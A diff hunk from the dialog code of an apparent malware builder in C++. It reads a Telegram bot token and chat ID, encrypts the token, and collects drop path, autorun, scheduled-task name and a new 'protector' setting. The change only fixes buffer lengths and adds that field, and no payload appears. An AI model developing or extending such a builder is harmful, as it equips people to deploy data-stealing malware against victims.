@@ -80,21 +80,22 @@ INT_PTR DlgProc::DlgMain(HWND hWnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
 				case IDC_STATIC3:
 				{
 					Builder::Settings s;
-					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT1), s.botapi, 127);
+					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT1), s.botapi, (sizeof(s.botapi) - 1));
 					
 					strcpy(s.key, Manager::RandomStr(CryptoPP::AES::DEFAULT_KEYLENGTH).c_str());
 					strcpy(s.botapi, Manager::EncryptStr(s.botapi, s.key).c_str());
 
-					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT2), s.chatid, 127);
+					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT2), s.chatid, (sizeof(s.chatid) - 1));
 
 					INT TextLen = GetWindowTextLengthA(GetDlgItem(hWnd, IDC_EDIT3)) + 1;
 					char* buff = new char[TextLen];
 					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT3), buff, TextLen);
 
-					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT4), s.drop, 127);
-					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT5), s.client_delay, 127);
-					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT6), s.autorun, 127);
-					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT7), s.scheduler_name, 127);
+					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT4), s.drop, (sizeof(s.drop) - 1));
+					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT5), s.client_delay, (sizeof(s.client_delay) - 1));
+					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT6), s.autorun, (sizeof(s.autorun) - 1));
+					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT7), s.scheduler_name, (sizeof(s.scheduler_name) - 1));
+					GetWindowTextA(GetDlgItem(hWnd, IDC_EDIT8), s.protectorName, (sizeof(s.protectorName) - 1));
 
 					UINT State = SendMessage(GetDlgItem(hWnd, IDC_CHECK1), BM_GETCHECK, 0, 0);
 					if (State == BST_CHECKED) {
